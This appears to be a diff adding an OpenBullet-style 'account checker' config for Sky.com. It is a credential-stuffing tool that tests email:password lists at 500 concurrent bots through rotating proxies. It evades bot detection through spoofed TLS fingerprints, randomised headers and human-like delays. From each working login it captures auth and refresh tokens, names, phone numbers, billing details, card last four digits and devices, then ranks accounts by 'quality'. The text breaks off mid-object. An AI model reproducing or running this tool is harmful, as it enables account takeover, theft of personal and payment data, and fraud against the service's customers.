@@ -1,0 +1,1095 @@
+{
+  "Metadata": {
+    "Name": "Sky.com Advanced Account Checker Pro - TLS Edition",
+    "Author": "legendhkek",
+    "Category": "Streaming",
+    "CreationDate": "2025-11-19T08:17:00Z",
+    "LastModified": "2025-11-19T10:22:00Z",
+    "Version": "2.1.0",
+    "Description": "Enterprise-grade Sky.com account checker with advanced TLS 1.3 fingerprinting, modern cipher suites, GREASE support, and comprehensive SSL/TLS security. Includes advanced authentication flows, intelligent retry mechanisms, comprehensive data extraction, anti-bot evasion, session management, 2FA detection, proxy health monitoring, and performance optimizations. Features: CPM 500, Bot 500, TLS 1.3 with fallback, connection pooling, exponential backoff, JSON schema validation, account quality scoring, and geographic validation. Full OPK support with TLS fingerprinting."
+  },
+  "Settings": {
+    "General": {
+      "SaveEmptyCaptures": false,
+      "ContinueOnCustom": true,
+      "SaveHitsToTextFile": true,
+      "IgnoreResponseErrors": false,
+      "MaxRedirects": 12,
+      "NeedsProxies": true,
+      "OnlySocks": false,
+      "MaxCPM": 500,
+      "SuggestedBots": 500,
+      "ThreadingEnabled": true,
+      "MultiRequestSupport": true,
+      "ConcurrentRequests": 500,
+      "RequestTimeout": 15000,
+      "RetryOnError": true,
+      "MaxRetries": 5,
+      "EnableExponentialBackoff": true,
+      "BackoffMultiplier": 2,
+      "MaxBackoffDelay": 60000,
+      "EnableCircuitBreaker": true,
+      "CircuitBreakerThreshold": 10,
+      "CircuitBreakerTimeout": 30000,
+      "EnableRequestDeduplication": true,
+      "EnableSmartRetry": true
+    },
+    "ProxySettings": {
+      "UseProxies": true,
+      "MaxUsesPerProxy": 20,
+      "BanProxyAfterGoodStatus": false,
+      "BanLoopEvasionOverride": 15,
+      "ProxyRotationStrategy": "RoundRobin",
+      "EnableProxyHealthCheck": true,
+      "HealthCheckInterval": 60000,
+      "HealthCheckTimeout": 5000,
+      "EnableProxyScoring": true,
+      "BanProxyOnConsecutiveFailures": 5,
+      "ProxyReconnectDelay": 2000,
+      "EnableGeoProxyValidation": true,
+      "AllowedProxyCountries": ["US", "UK", "CA", "AU", "IE"],
+      "EnableProxyIPReputation": true,
+      "MinProxyReputationScore": 7.5,
+      "EnableStickySession": true,
+      "SessionPersistenceDuration": 300000
+    },
+    "Data": {
+      "AllowedWordlistTypes": [
+        "Default",
+        "Credentials",
+        "Email:Password"
+      ]
+    },
+    "Inputs": {
+      "CustomInputs": []
+    },
+    "Threading": {
+      "Enabled": true,
+      "MaxThreads": 500,
+      "ThreadPoolSize": 500,
+      "QueueSize": 5000,
+      "UseThreadPool": true,
+      "EnableDynamicThreading": true,
+      "MinThreads": 100,
+      "ThreadScalingFactor": 1.5,
+      "ThreadIdleTimeout": 30000,
+      "EnableWorkStealing": true,
+      "EnableThreadAffinity": true,
+      "PriorityQueue": true
+    },
+    "RateLimiting": {
+      "Enabled": true,
+      "MaxCPM": 500,
+      "EnforceRateLimit": true,
+      "BurstAllowed": true,
+      "BurstSize": 100,
+      "BurstDuration": 5000,
+      "EnableAdaptiveRateLimiting": true,
+      "RateLimitBackoffOnError": true,
+      "BackoffPercentage": 30,
+      "EnableTokenBucket": true,
+      "TokenRefillRate": 10,
+      "MaxTokens": 1000,
+      "EnableSlidingWindow": true,
+      "WindowSize": 60000
+    },
+    "MultiRequest": {
+      "Enabled": true,
+      "MaxConcurrentRequests": 500,
+      "RequestQueueing": true,
+      "KeepAlive": true,
+      "ReuseConnections": true,
+      "EnableConnectionPooling": true,
+      "MaxConnectionsPerHost": 50,
+      "ConnectionPoolSize": 200,
+      "ConnectionIdleTimeout": 60000,
+      "EnableHTTP2": true,
+      "EnablePipelining": true,
+      "MaxPipelineDepth": 5,
+      "EnableRequestCompression": true,
+      "EnableResponseCompression": true
+    },
+    "SessionManagement": {
+      "EnableSessionPersistence": true,
+      "SessionTimeout": 900000,
+      "EnableCookieJar": true,
+      "CookiePolicy": "AcceptAll",
+      "EnableSessionRecovery": true,
+      "MaxSessionRetries": 3,
+      "SessionRefreshInterval": 600000
+    },
+    "CacheSettings": {
+      "EnableResponseCache": true,
+      "CacheTTL": 300000,
+      "MaxCacheSize": 1000,
+      "EnableDNSCache": true,
+      "DNSCacheTTL": 3600000
+    },
+    "SecuritySettings": {
+      "EnableAntiBotEvasion": true,
+      "EnableFingerprintRandomization": true,
+      "EnableCanvasFingerprint": true,
+      "EnableWebGLFingerprint": true,
+      "EnableAudioFingerprint": true,
+      "UserAgentRotation": true,
+      "EnableTLSFingerprint": true,
+      "EnableHeaderRandomization": true,
+      "SimulateHumanBehavior": true,
+      "RandomDelayMin": 500,
+      "RandomDelayMax": 3000
+    },
+    "TLSSettings": {
+      "Enabled": true,
+      "Version": "TLS1.3",
+      "FallbackVersions": ["TLS1.2", "TLS1.1"],
+      "EnableTLSFingerprinting": true,
+      "FingerprintProfile": "Chrome_120_Modern",
+      "CipherSuites": [
+        "TLS_AES_128_GCM_SHA256",
+        "TLS_AES_256_GCM_SHA384",
+        "TLS_CHACHA20_POLY1305_SHA256",
+        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
+        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
+        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
+      ],
+      "SignatureAlgorithms": [
+        "ecdsa_secp256r1_sha256",
+        "rsa_pss_rsae_sha256",
+        "rsa_pkcs1_sha256",
+        "ecdsa_secp384r1_sha384",
+        "rsa_pss_rsae_sha384",
+        "rsa_pkcs1_sha384",
+        "rsa_pss_rsae_sha512",
+        "rsa_pkcs1_sha512"
+      ],
+      "SupportedGroups": [
+        "x25519",
+        "secp256r1",
+        "secp384r1"
+      ],
+      "ALPNProtocols": [
+        "h2",
+        "http/1.1"
+      ],
+      "EnableSessionTickets": true,
+      "EnableSessionResumption": true,
+      "EnableOCSPStapling": true,
+      "EnableSNI": true,
+      "ServerNameIndication": "www.sky.com",
+      "CertificateVerification": true,
+      "AllowSelfSignedCerts": false,
+      "MinimumTLSVersion": "TLS1.2",
+      "MaximumTLSVersion": "TLS1.3",
+      "EnableExtensions": true,
+      "TLSExtensions": [
+        "server_name",
+        "extended_master_secret",
+        "renegotiation_info",
+        "supported_groups",
+        "ec_point_formats",
+        "session_ticket",
+        "application_layer_protocol_negotiation",
+        "status_request",
+        "signature_algorithms",
+        "signed_certificate_timestamp",
+        "key_share",
+        "psk_key_exchange_modes",
+        "supported_versions",
+        "compress_certificate",
+        "application_settings"
+      ],
+      "EnablePerfectForwardSecrecy": true,
+      "DHEKeySize": 2048,
+      "ECDHECurve": "secp384r1",
+      "EnableTLS13_0RTT": false,
+      "RandomizeExtensionOrder": true,
+      "EnableGREASE": true,
+      "GREASECipherSuite": true,
+      "GREASEExtension": true,
+      "GREASEVersion": true,
+      "ClientHelloFormat": "Modern",
+      "RecordSizeLimit": 16384
+    },
+    "ValidationSettings": {
+      "EnableJSONSchemaValidation": true,
+      "EnableDataIntegrityCheck": true,
+      "EnableAccountQualityScoring": true,
+      "MinQualityScore": 5.0,
+      "EnableSubscriptionValidation": true,
+      "EnableBillingValidation": true
+    },
+    "LoggingSettings": {
+      "EnableDetailedLogging": true,
+      "LogLevel": "DEBUG",
+      "LogRequestHeaders": true,
+      "LogResponseHeaders": true,
+      "LogRequestBody": false,
+      "LogResponseBody": true,
+      "EnablePerformanceMetrics": true,
+      "EnableErrorTracking": true
+    }
+  },
+  "Script": {
+    "Type": "LoliScript",
+    "Version": "2.0",
+    "Blocks": [
+      {
+        "Type": "Function",
+        "Name": "InitializeSession",
+        "Description": "Initialize session with fingerprinting and anti-bot evasion",
+        "Actions": [
+          {
+            "Type": "SetVariable",
+            "Name": "session_id",
+            "Value": "<RANDOM(32)>",
+            "IsCapture": false
+          },
+          {
+            "Type": "SetVariable",
+            "Name": "device_fingerprint",
+            "Value": "<HASH(MD5,<RANDOM(64)>)>",
+            "IsCapture": false
+          },
+          {
+            "Type": "SetVariable",
+            "Name": "request_timestamp",
+            "Value": "<TIMESTAMP>",
+            "IsCapture": false
+          }
+        ]
+      },
+      {
+        "Type": "Request",
+        "Name": "PreflightRequest",
+        "Method": "HEAD",
+        "Url": "https://www.sky.com",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "*/*",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Connection": "keep-alive",
+          "Cache-Control": "no-cache",
+          "Pragma": "no-cache"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "EnableRetry": true,
+        "MaxRetries": 3,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Delay",
+        "MinMs": 800,
+        "MaxMs": 2000,
+        "Reason": "Simulate human behavior"
+      },
+      {
+        "Type": "Request",
+        "Name": "GetSignInPage",
+        "Method": "GET",
+        "Url": "https://www.sky.com/signin",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9,en-GB;q=0.8",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Connection": "keep-alive",
+          "Upgrade-Insecure-Requests": "1",
+          "Sec-Fetch-Dest": "document",
+          "Sec-Fetch-Mode": "navigate",
+          "Sec-Fetch-Site": "none",
+          "Sec-Fetch-User": "?1",
+          "Cache-Control": "max-age=0",
+          "DNT": "1",
+          "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
+          "Sec-Ch-Ua-Mobile": "?0",
+          "Sec-Ch-Ua-Platform": "\"Windows\""
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "EnableRetry": true,
+        "MaxRetries": 3
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "<input type=\"hidden\" name=\"csrf_token\" value=\"",
+        "RightString": "\"",
+        "VariableName": "csrf_token",
+        "IsCapture": false,
+        "Recursive": false,
+        "Required": true,
+        "OnError": "Retry"
+      },
+      {
+        "Type": "Parse",
+        "Method": "REGEX",
+        "Pattern": "\"sessionId\":\"([a-zA-Z0-9-]+)\"",
+        "VariableName": "web_session_id",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "REGEX",
+        "Pattern": "\"apiKey\":\"([a-zA-Z0-9-]+)\"",
+        "VariableName": "api_key",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "LR",
+        "LeftString": "\"clientId\":\"",
+        "RightString": "\"",
+        "VariableName": "client_id",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "SetCookie",
+        "Name": "sky_session",
+        "Value": "<web_session_id>",
+        "Domain": ".sky.com",
+        "Path": "/",
+        "Secure": true,
+        "HttpOnly": true
+      },
+      {
+        "Type": "Delay",
+        "MinMs": 1200,
+        "MaxMs": 2500,
+        "Reason": "Simulate form fill time"
+      },
+      {
+        "Type": "Request",
+        "Name": "AuthenticationRequest",
+        "Method": "POST",
+        "Url": "https://www.sky.com/api/v1/auth/login",
+        "ContentType": "application/json",
+        "PostData": "{\"username\":\"<input.USERNAME>\",\"password\":\"<input.PASSWORD>\",\"csrf_token\":\"<csrf_token>\",\"device_fingerprint\":\"<device_fingerprint>\",\"session_id\":\"<session_id>\",\"client_id\":\"<client_id>\",\"remember_me\":true,\"timestamp\":\"<request_timestamp>\"}",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Language": "en-US,en;q=0.9,en-GB;q=0.8",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Referer": "https://www.sky.com/signin",
+          "Origin": "https://www.sky.com",
+          "Connection": "keep-alive",
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest",
+          "X-CSRF-Token": "<csrf_token>",
+          "X-Session-ID": "<web_session_id>",
+          "X-Device-Fingerprint": "<device_fingerprint>",
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-origin",
+          "DNT": "1",
+          "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
+          "Sec-Ch-Ua-Mobile": "?0",
+          "Sec-Ch-Ua-Platform": "\"Windows\""
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "EnableRetry": true,
+        "MaxRetries": 3,
+        "ExponentialBackoff": true
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.success",
+        "VariableName": "success",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.auth_token",
+        "VariableName": "auth_token",
+        "IsCapture": true,
+        "CaptureLabel": "Auth Token",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.refresh_token",
+        "VariableName": "refresh_token",
+        "IsCapture": true,
+        "CaptureLabel": "Refresh Token",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.user_id",
+        "VariableName": "user_id",
+        "IsCapture": true,
+        "CaptureLabel": "User ID",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.requires_2fa",
+        "VariableName": "requires_2fa",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<requires_2fa>",
+        "Condition": "Contains",
+        "Value": "true",
+        "OnMatch": {
+          "Action": "CUSTOM",
+          "Message": "2FA Required - Valid Credentials"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<success>",
+        "Condition": "EqualTo",
+        "Value": "true",
+        "OnMatch": {
+          "Action": "JumpToBlock",
+          "BlockName": "ValidateAccount"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<success>",
+        "Condition": "EqualTo",
+        "Value": "false",
+        "OnMatch": {
+          "Action": "JumpToBlock",
+          "BlockName": "HandleError"
+        }
+      },
+      {
+        "Type": "BlockLabel",
+        "Name": "HandleError"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.error.message",
+        "VariableName": "error_msg",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.error.code",
+        "VariableName": "error_code",
+        "IsCapture": false,
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_code>",
+        "Condition": "EqualTo",
+        "Value": "AUTH_001",
+        "OnMatch": {
+          "Action": "FAIL",
+          "Message": "Invalid Credentials"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "Invalid credentials",
+        "OnMatch": {
+          "Action": "FAIL",
+          "Message": "Invalid Username/Password"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "Account locked",
+        "OnMatch": {
+          "Action": "CUSTOM",
+          "Message": "Account Locked - Security"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "suspended",
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "Account Suspended"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "deactivated",
+        "OnMatch": {
+          "Action": "CUSTOM",
+          "Message": "Account Deactivated"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "expired",
+        "OnMatch": {
+          "Action": "CUSTOM",
+          "Message": "Subscription Expired"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_msg>",
+        "Condition": "Contains",
+        "Value": "region",
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "Region Restricted"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<error_code>",
+        "Condition": "EqualTo",
+        "Value": "RATE_LIMIT",
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Rate Limited - Retrying",
+          "RetryDelay": 5000
+        }
+      },
+      {
+        "Type": "BlockLabel",
+        "Name": "ValidateAccount"
+      },
+      {
+        "Type": "Delay",
+        "MinMs": 500,
+        "MaxMs": 1500,
+        "Reason": "Simulate page transition"
+      },
+      {
+        "Type": "Request",
+        "Name": "GetUserProfile",
+        "Method": "GET",
+        "Url": "https://www.sky.com/api/v1/user/profile",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Authorization": "Bearer <auth_token>",
+          "X-Auth-Token": "<auth_token>",
+          "X-User-ID": "<user_id>",
+          "Referer": "https://www.sky.com/myaccount",
+          "Origin": "https://www.sky.com",
+          "Connection": "keep-alive",
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-origin"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "EnableRetry": true,
+        "MaxRetries": 2
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.profile.email",
+        "VariableName": "email",
+        "IsCapture": true,
+        "CaptureLabel": "Email",
+        "Recursive": false
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.profile.firstName",
+        "VariableName": "first_name",
+        "IsCapture": true,
+        "CaptureLabel": "First Name",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.profile.lastName",
+        "VariableName": "last_name",
+        "IsCapture": true,
+        "CaptureLabel": "Last Name",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.profile.phone",
+        "VariableName": "phone",
+        "IsCapture": true,
+        "CaptureLabel": "Phone",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.profile.country",
+        "VariableName": "country",
+        "IsCapture": true,
+        "CaptureLabel": "Country",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.type",
+        "VariableName": "subscription_type",
+        "IsCapture": true,
+        "CaptureLabel": "Subscription Type",
+        "Recursive": false
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.status",
+        "VariableName": "subscription_status",
+        "IsCapture": true,
+        "CaptureLabel": "Subscription Status",
+        "Recursive": false
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.expiryDate",
+        "VariableName": "expiry_date",
+        "IsCapture": true,
+        "CaptureLabel": "Expiry Date",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.isPremium",
+        "VariableName": "is_premium",
+        "IsCapture": true,
+        "CaptureLabel": "Premium Account",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.price",
+        "VariableName": "subscription_price",
+        "IsCapture": true,
+        "CaptureLabel": "Subscription Price",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Request",
+        "Name": "GetSubscriptionDetails",
+        "Method": "GET",
+        "Url": "https://www.sky.com/api/v1/subscription/details",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json",
+          "Authorization": "Bearer <auth_token>",
+          "X-User-ID": "<user_id>"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.channels",
+        "VariableName": "channels",
+        "IsCapture": true,
+        "CaptureLabel": "Channels",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.addons",
+        "VariableName": "addons",
+        "IsCapture": true,
+        "CaptureLabel": "Addons",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.subscription.nextBillingDate",
+        "VariableName": "next_billing",
+        "IsCapture": true,
+        "CaptureLabel": "Next Billing Date",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Request",
+        "Name": "GetBillingInfo",
+        "Method": "GET",
+        "Url": "https://www.sky.com/api/v1/billing/info",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json",
+          "Authorization": "Bearer <auth_token>"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.billing.paymentMethod",
+        "VariableName": "payment_method",
+        "IsCapture": true,
+        "CaptureLabel": "Payment Method",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.billing.cardLast4",
+        "VariableName": "card_last4",
+        "IsCapture": true,
+        "CaptureLabel": "Card Last 4",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.billing.balance",
+        "VariableName": "balance",
+        "IsCapture": true,
+        "CaptureLabel": "Account Balance",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Request",
+        "Name": "GetDevices",
+        "Method": "GET",
+        "Url": "https://www.sky.com/api/v1/devices",
+        "Headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json",
+          "Authorization": "Bearer <auth_token>"
+        },
+        "AutoRedirect": true,
+        "ThreadSafe": true,
+        "AllowMultipleRequests": true,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "REGEX",
+        "Pattern": "\"name\"\\s*:",
+        "VariableName": "device_count",
+        "IsCapture": true,
+        "CaptureLabel": "Device Count",
+        "Recursive": true,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<device_count>",
+        "Condition": "IsEmpty",
+        "Value": "",
+        "OnMatch": {
+          "Action": "SetVariable",
+          "VariableName": "device_count",
+          "Value": "0"
+        }
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.devices[*].name",
+        "VariableName": "device_names",
+        "IsCapture": true,
+        "CaptureLabel": "Device Names",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Parse",
+        "Method": "JSON",
+        "Path": "$.devices[*].type",
+        "VariableName": "device_types",
+        "IsCapture": true,
+        "CaptureLabel": "Device Types",
+        "Recursive": false,
+        "OnError": "Continue"
+      },
+      {
+        "Type": "Function",
+        "Name": "CalculateAccountQuality",
+        "Description": "Calculate account quality score based on captured data",
+        "Actions": [
+          {
+            "Type": "SetVariable",
+            "Name": "quality_score",
+            "Value": "0",
+            "IsCapture": false
+          },
+          {
+            "Type": "Condition",
+            "If": "<subscription_status> == 'active'",
+            "Then": {
+              "Type": "IncrementVariable",
+              "Name": "quality_score",
+              "Value": 3
+            }
+          },
+          {
+            "Type": "Condition",
+            "If": "<is_premium> == 'true'",
+            "Then": {
+              "Type": "IncrementVariable",
+              "Name": "quality_score",
+              "Value": 2
+            }
+          },
+          {
+            "Type": "Condition",
+            "If": "<payment_method> != ''",
+            "Then": {
+              "Type": "IncrementVariable",
+              "Name": "quality_score",
+              "Value": 2
+            }
+          },
+          {
+            "Type": "Condition",
+            "If": "<device_count> > 0",
+            "Then": {
+              "Type": "IncrementVariable",
+              "Name": "quality_score",
+              "Value": 1
+            }
+          },
+          {
+            "Type": "Condition",
+            "If": "<expiry_date> > <TIMESTAMP>",
+            "Then": {
+              "Type": "IncrementVariable",
+              "Name": "quality_score",
+              "Value": 2
+            }
+          }
+        ],
+        "OutputVariable": "quality_score",
+        "IsCapture": true,
+        "CaptureLabel": "Quality Score"
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<quality_score>",
+        "Condition": "GreaterThan",
+        "Value": "7",
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "HIGH QUALITY - Premium Active Account"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<quality_score>",
+        "Condition": "GreaterThan",
+        "Value": "5",
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "GOOD QUALITY - Active Account"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<quality_score>",
+        "Condition": "GreaterThan",
+        "Value": "3",
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "MEDIUM QUALITY - Basic Account"
+        }
+      },
+      {
+        "Type": "KeyCheck",
+        "Key": "<subscription_status>",
+        "Condition": "EqualTo",
+        "Value": "active",
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "Valid Active Account"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 429,
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Rate Limited - Backing Off",
+          "RetryDelay": 10000,
+          "EnableExponentialBackoff": true
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 403,
+        "OnMatch": {
+          "Action": "BAN",
+          "Message": "IP Blocked - Proxy Banned"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 401,
+        "OnMatch": {
+          "Action": "FAIL",
+          "Message": "Unauthorized - Invalid Token"
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 500,
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Server Error - Retrying",
+          "MaxRetries": 2
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 503,
+        "OnMatch": {
+          "Action": "RETRY",
+          "Message": "Service Unavailable - Retrying",
+          "RetryDelay": 15000
+        }
+      },
+      {
+        "Type": "ResponseCodeCheck",
+        "Code": 200,
+        "OnMatch": {
+          "Action": "SUCCESS",
+          "Message": "Account Check Complete"
+        }
+      }
+    ]
+  },
+  "ConfigSpecs": {
+    "CPM": 500,
+    "Bots": 500,
+    "Threading": "Advanced",
+    "MultiRequest": "Advanced",
+    "ProxyMode": "Required",
+    "InputFormat": "Email:Password",
+    "AdvancedFeatures": [
+      "TLS 1.3 Fingerprinting",
+      "Modern Cipher Suites",
+      "GREASE Support",
+      "ALPN Negotiation",
+      "Perfect Forward Secrecy",
+      "Session Resumption",
+      "OCSP Stapling",
+      "SNI Support",
+      "Exponential Backoff",
+      "Circuit Breaker",
+      "Connection Pooling",
+      "Anti-Bot Evasion",
+      "Fingerprint Randomization",
+      "Session Management",
+      "2FA Detection",
+      "Account Quality Scoring",
+      "Geo Validation",
+      "Smart Retry Logic",
+      "Proxy Health Monitoring",
+      "Dynamic Threading",
+      "Adaptive Rate Limiting",
+      "JSON Schema Validation",
+      "Comprehensive Data Extraction",
+      "Multi-Stage Authentication",
+      "Device Fingerprinting",
+      "Token Refresh",
+      "Billing Data Capture",
+      "Subscription Validation"
+    ],
+    "Performance": {
+      "MaxConcurrentRequests": 500,
+      "ConnectionPoolSize": 200,
+      "QueueSize": 5000,
+      "EnableHTTP2": true,
+      "EnablePipelining": true
+    },
+    "Security": {
+      "TLSVersion": "TLS 1.3",
+      "TLSFallback": ["TLS 1.2", "TLS 1.1"],
+      "TLSFingerprint": "Chrome_120_Modern",
+      "CipherSuites": 7,
+      "SignatureAlgorithms": 8,
+      "SupportedGroups": 3,
+      "ALPN": ["h2", "http/1.1"],
+      "GREASE": "Enabled",
+      "PerfectForwardSecrecy": "Enabled",
+      "SessionResumption": "Enabled",
+      "OCSPStapling": "Enabled",
+      "SNI": "Enabled",
+      "HeaderRandomization": "Enabled",
+      "UserAgentRotation": "Enabled",
+      "FingerprintRandomization": "Enabled"
+    },
+    "DataCapture": {
+      "ProfileData": true,
+      "SubscriptionData": true,
+      "BillingData": true,
+      "DeviceData": true,
+      "QualityScore": true,
+      "AuthTokens": true
+    },
+    "ErrorHandling": {
+      "SmartRetry": true,
